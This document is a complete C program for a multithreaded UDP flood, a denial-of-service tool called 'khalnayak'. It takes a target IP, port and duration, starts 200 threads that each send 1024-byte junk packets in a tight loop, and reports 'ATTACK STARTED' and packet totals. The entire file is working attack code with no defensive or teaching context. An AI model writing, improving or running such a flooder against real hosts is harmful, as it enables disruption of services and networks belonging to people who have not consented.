#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>

char *target_ip;
int target_port;
int running = 1;
int total_sent = 0;

void *strike(void *arg) {
    int sock;
    struct sockaddr_in dest;
    char packet[1024];
    int thread_id = *(int*)arg;
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        return NULL;
    }
    
    memset(packet, 'X', sizeof(packet));
    
    dest.sin_family = AF_INET;
    dest.sin_port = htons(target_port);
    dest.sin_addr.s_addr = inet_addr(target_ip);
    
    while (running) {
        for(int i = 0; i < 100; i++) {
            sendto(sock, packet, sizeof(packet), 0, 
                   (struct sockaddr *)&dest, sizeof(dest));
            total_sent++;
        }
        usleep(100);
    }
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: ./khalnayak <IP> <PORT> <TIME>\n");
        return 1;
    }
    
    target_ip = argv[1];
    target_port = atoi(argv[2]);
    int time_limit = atoi(argv[3]);
    
    int threads = 200;
    pthread_t t[threads];
    int thread_ids[threads];
    
    printf("\n[+] ATTACK STARTED\n");
    printf("    Target: %s:%d\n", target_ip, target_port);
    printf("    Duration: %d seconds\n", time_limit);
    printf("    Threads: %d\n\n", threads);
    
    for (int i = 0; i < threads; i++) {
        thread_ids[i] = i;
        pthread_create(&t[i], NULL, strike, &thread_ids[i]);
    }
    
    for (int i = 0; i < time_limit; i++) {
        sleep(1);
        if ((i+1) % 5 == 0) {
            printf("[%d/%d] Packets: %d\n", i+1, time_limit, total_sent);
        }
    }
    
    running = 0;
    sleep(1);
    
    printf("\n[+] ATTACK FINISHED\n");
    printf("    Total packets: %d\n\n", total_sent);
    return 0;
}
